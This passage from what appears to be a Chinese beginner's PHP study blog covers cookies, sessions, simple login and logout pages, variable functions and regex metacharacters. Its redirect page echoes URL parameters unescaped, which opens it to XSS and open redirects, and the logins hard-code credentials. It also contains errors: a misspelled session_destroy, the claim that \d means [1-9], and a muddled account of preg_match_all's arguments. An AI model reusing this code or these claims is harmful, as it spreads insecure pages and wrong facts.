src="https://img-blog.csdnimg.cn/20200418175239707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>1.向客户端电脑中设置cookie<br><code>setcookie()</code><br>2.在服务器端上读取cookie的内容<br><code>$_COOKIE</code><br>3.将多维数组应用于cookie中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;member[name]&quot;</span>,<span class="string">&#x27;j4y&#x27;</span>);</span><br><span class="line">setcookie(<span class="string">&quot;member[email]&quot;</span>,<span class="string">&#x27;123456789@qq.com&#x27;</span>);</span><br></pre></td></tr></table></figure><p>4.删除cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;member&quot;</span>,time()<span class="number">-1</span>);<span class="comment">//时间单位是秒。</span></span><br><span class="line"><span class="comment">//补充</span></span><br><span class="line">setcookie()有第四个参数，设定有效存放路径“/”表示web根目录，web下的所有目录有效。</span><br><span class="line">默认目录是当前目录。</span><br></pre></td></tr></table></figure><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session技术与cookie相似，用来储存使用者的相关资料，但是最大的不同之处在于Cookie是将资料储存在客户端电脑中，而Session则是将数据存放在服务器上。<br><img src="https://img-blog.csdnimg.cn/20200419091832554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>1.开启session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>开启一个会话，或者打开一个已存在的会话。<br>2.使用session存储数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;j4y&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;email&#x27;</span>]=<span class="string">&#x27;123456789@qq.com&#x27;</span>;</span><br></pre></td></tr></table></figure><p>3.注销变量与销毁session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();<span class="comment">//打开要销毁的会话</span></span><br><span class="line">session_unset();<span class="comment">//free all session variables</span></span><br><span class="line">session_destory();<span class="comment">//销毁一个会话中的全部数据</span></span><br><span class="line">setcookie(session_name(),<span class="string">&#x27;&#x27;</span>,time()<span class="number">-3600</span>);<span class="comment">//销毁保存在客户端的卡号（即session_id）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="基于cookie和session的登录页面"><a href="#基于cookie和session的登录页面" class="headerlink" title="基于cookie和session的登录页面"></a>基于cookie和session的登录页面</h2><h3 id="基于cookie"><a href="#基于cookie" class="headerlink" title="基于cookie"></a>基于cookie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;j4y&#x27;</span> &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>]===<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (setcookie(<span class="string">&#x27;username&#x27;</span>,$_POST[<span class="string">&#x27;username&#x27;</span>],time()+<span class="number">3600</span>))&#123;</span><br><span class="line">            header(<span class="string">&#x27;Location:1.php&#x27;</span>);<span class="comment">//跳转到指定网页</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;cookie设置失败！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;对不起，登录失败，请检查您的用户名或者密码是否正确，注意密码安全，嘻嘻！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;请登录&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;login.php&quot;</span>&gt;</span><br><span class="line">    姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200419133339961.png" alt="Augenstern" loading="lazy"></p><h3 id="基于session"><a href="#基于session" class="headerlink" title="基于session"></a>基于session</h3><p>登录页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_SESSION[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;j4y&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;您已登录，请不要重复登录&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;j4y&#x27;</span> &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>]===<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;username&#x27;</span>]=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        header(<span class="string">&#x27;Location:skip.php?url=j4y.php&amp;info=登录成功，正在跳转中····&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;对不起，登录失败，请检查您的用户名或者密码是否正确，注意密码安全，嘻嘻！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;请登录&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;login.php&quot;</span>&gt;</span><br><span class="line">    姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">    密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>登录进去后显示的页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//j4y.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_SESSION[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;j4y&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎回来！&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;login.php&#x27;&gt;请登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登出(注销)页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//logout.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; $_SESSION[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;j4y&#x27;</span>)&#123;</span><br><span class="line">    session_unset();</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(session_name(),<span class="string">&#x27;&#x27;</span>,time()<span class="number">-3600</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location:skip.php?url=j4y.php&amp;info=注销成功，正在跳转中···&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:skip.php?url=j4y.php&amp;info=注销失败，请您检查网络连接是否成功，并稍后再试！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跳转页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//skip.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;3;URL=&lt;?php echo $_GET[&#x27;url&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;正在跳转中···&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;font-size: 20px;&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">&#x27;info&#x27;</span>] <span class="meta">?&gt;</span><span class="number">3</span>秒后自动跳转！&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>经过这次学习，学到了很多有趣的东西，虽然同样是我不喜欢的敲代码，但是不知道为什么，我自己学编程语言，会有点成就感，又学到了技能，感觉很充实。继续加油。<br>            <img src="https://img-blog.csdnimg.cn/20200419145951197.jpg" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(2)</title>
      <link href="/2020/08/23/PHP%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/08/23/PHP%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p>PHP支持可变函数的概念，就是说如果一个变量名后面有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它。<br>可变函数代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">one</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;In one()\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params">$a = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;In two();argument was &#x27;$a&#x27;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用echo的包装函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">three</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $string;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="string">&#x27;one&#x27;</span>;</span><br><span class="line">$b();</span><br><span class="line">$b = <span class="string">&#x27;two&#x27;</span>;</span><br><span class="line">$b(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$b = <span class="string">&#x27;three&#x27;</span>;</span><br><span class="line">$b(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>加上运行结果，回头复习更加容易理解。<br><img src="https://img-blog.csdnimg.cn/2020040709170730.png" alt="Augenstern" loading="lazy"></p><h2 id="内部（内置）函数"><a href="#内部（内置）函数" class="headerlink" title="内部（内置）函数"></a>内部（内置）函数</h2><p>PHP有很多标准的函数和结构，还有一些函数需要和特定的PHP扩展模块一起编译，否则在使用他们的时候，就会报错为“未定义函数”。<br>比如要使用<code>image</code>函数中的<code>imagecreatetruecolor()</code>，需要在编译PHP时加上适合的扩展模块。还有，要使用<code>mysql_connect()</code>函数，就需要在编译时加上<code>mysql</code>支持，</p><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>正则表达式是对字符串（包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”））操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。正则表达式是一种文本模式，该模式描述在搜索文本时要匹配的一个或多个字符串。</p><h2 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h2><p>我们一般使用正斜杠‘/’，来作为定界符，当然也可以使用其它的符号比如<code>!!、##、&#123;&#125;、||</code>定界符代表一个正则表达式的开始与结束。（必须是前后一致的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/test/&#x27;</span>;</span><br><span class="line">$str = <span class="string">&#x27;abctestdhdantest&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>preg_match_all()</code>按照指定的正则表达式，在给定的字符串中进行搜索，匹配到符合特征的部分取出来。它有三个参数，第一个是需要搜索的字符串，第二个是给定搜索的字符串范围，第三个参数可填可不填。可以看下面这个示例（删除之后）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/test/&#x27;</span>;</span><br><span class="line">$str = <span class="string">&#x27;abctestdhdantest&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果是<br><img src="https://img-blog.csdnimg.cn/20200407103831839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>通过代码，可以直观的看出来定界符的用法</p><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>正则表达式里的普通字符。如a到z、A到Z、0到9、单引号、双引号。他们是没有特殊含义的。</p><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>元字符指的是在正则表达式中含有特殊含义的字符（不用背，用到时去查就OK）</p><h3 id="常见的元字符"><a href="#常见的元字符" class="headerlink" title="常见的元字符"></a>常见的元字符</h3><p><code>\d</code>    匹配任意一个十进制数字，等价于【1-9】<br><code>\D</code>    匹配任意一个除十进制数字以外的字符等价于【^0-9】<br><code>\s</code>    匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符。<br><code>\S</code>    匹配除空白字符以外任意一个字符<br><code>\w</code>    匹配任意一个数字或字母或下划线<br><code>\W</code>    匹配除数字、字母、下划线以外的任意一个字符<br><code>.</code>        匹配除换行符以外的任意一个字符<br><code>*</code>        匹配0次、或1次或多次其前面的字符，放在<code>*</code>前面的那个字符可以出现0次，也可以出现1次，也可以出现多次。<br>等等，<br>看下在代码中的作用，全放在一个代码中了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/t\dst/&#x27;</span>;</span><br><span class="line">$str =<span class="string">&#x27;ancasdst3stfdd&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line">$one = <span class="string">&#x27;/t\Dst/&#x27;</span>;</span><br><span class="line">$str1 = <span class="string">&#x27;snfjdt@stkkksnc&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($one, $str1, $arr1));</span><br><span class="line">var_dump($arr1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line">$two = <span class="string">&#x27;/t\sst/&#x27;</span>;</span><br><span class="line">$str2 = <span class="string">&#x27;sdst stffd&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($two, $str2, $arr2));</span><br><span class="line">var_dump($arr2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line">$three = <span class="string">&#x27;/t\wst/&#x27;</span>;</span><br><span class="line">$str3 = <span class="string">&#x27;asdat_stgggd&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($three, $str3, $arr3));</span><br><span class="line">var_dump($arr3);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line">$four = <span class="string">&#x27;/t.st/&#x27;</span>;</span><br><span class="line">$str4 = <span class="string">&#x27;sgddht@stfgg&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($four, $str4, $arr4));</span><br><span class="line">var_dump($arr4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line">$five = <span class="string">&#x27;/te*st/&#x27;</span>;</span><br><span class="line">$str5 = <span class="string">&#x27;hhdteeeeestfffds&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($five, $str5, $arr5));</span><br><span class="line">var_dump($arr5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407114401625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>元字符另外还有好多，<br><code>+</code>匹配一次或者多次前面的字符。<br><code>?</code>匹配一次或者零次前面的字符。<br><code>&#123;n&#125;</code>        前面的字符出现次数等于n次。<br><code>&#123;n,&#125;</code>        前面的字符出现次数不少于n次，也就是要大于等于n次。<br><code>&#123;n,m&#125;</code>        前面的字符出现次数至少出现n次，最多出现m次。<br><code>|</code>匹配两个或多个模式<br><code>[]</code>匹配方括号中的任意一个字符<br><code>^或\A</code>匹配字符串开始的位置<br><code>$或\Z</code>匹配字符串结束的位置<br><code>[^]</code>匹配除方括号中字符以外的任意一个字符。<br><code>()</code>将括号中作为一个整体，以便将其中的内容获取到。<br>等等</p><h3 id="元字符之间可以互相配合。"><a href="#元字符之间可以互相配合。" class="headerlink" title="元字符之间可以互相配合。"></a>元字符之间可以互相配合。</h3><p>比如<br><code>.</code>和<code>&#123;n&#125;</code>配合。匹配n个任意字符。<br><code>.</code>和<code>*</code>配合。匹配任意字符多个。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/t.*t/&#x27;</span>;</span><br><span class="line">$str =<span class="string">&#x27;ancasdst3fgfgfstfdddfjdkodt&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>.*</code>配合，默认情况尽可能多的匹配字符。（贪婪匹配）。<br>上面代码运行结果是<br><img src="https://img-blog.csdnimg.cn/20200407131018989.png" alt="Augenstern" loading="lazy"><br><code>.*?</code>配合，解决贪婪问题，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/t.*?t/&#x27;</span>;</span><br><span class="line">$str =<span class="string">&#x27;ancasdst3fgfgfstfdddfjdkodt&#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020040713104928.png" alt="Augenstern" loading="lazy"><br>之前看过一个python爬虫的代码，就有正则表达式，其中还用到了<code>.*?</code>这个组合的元字符。之前还不懂是什么意思。</p><h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><p><code>i</code> 在和模式进行匹配时不区分大小写。<br>demo示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 